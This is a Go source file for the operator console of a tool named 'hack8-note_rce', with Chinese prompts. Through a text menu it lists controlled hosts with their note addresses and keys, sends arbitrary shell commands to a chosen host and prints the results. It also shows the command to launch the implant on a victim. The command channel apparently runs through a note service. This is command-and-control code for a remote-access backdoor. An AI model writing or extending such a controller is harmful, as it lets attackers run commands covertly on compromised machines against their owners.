package main

import (
	"fmt"
	"hack8-note_rce/Util"
)

func main() {
	var admin string
	fmt.Println("被控端运行命令 key参数制定notekey admin参数制定主控地址（建议更改） ：\n./server --key notekey --admin ocis")

	fmt.Println("请输入主控地址(默认为ocis)：")
	fmt.Scan(&admin)

	for {
		console := 0
		fmt.Println("\n\n1.被控端列表(被控端失联后不会自动更新)\n2.执行主机命令\n3.更新被控端列表(需等待30秒)\n")
		fmt.Scan(&console)
		if console == 1 {
			list := Util.HostList(admin)
			for i := range list {
				fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
			}
		} else if console == 2 {
			var noteid string
			var notekey string
			var command string

			fmt.Print("请输入note地址:")
			fmt.Scan(&noteid)
			fmt.Print("请输入notekey:")
			fmt.Scan(&notekey)
			fmt.Print("请输入shell命令:")
			fmt.Scan(&command)
			fmt.Println("请等待30秒")

			res := Util.Hostexec(noteid, notekey, command)
			fmt.Println(res)
		} else if console == 3 {
			Util.RefreshHost(admin)
			fmt.Println("刷新成功")
		} else {
			fmt.Println("功能暂未开发")
		}
	}
}
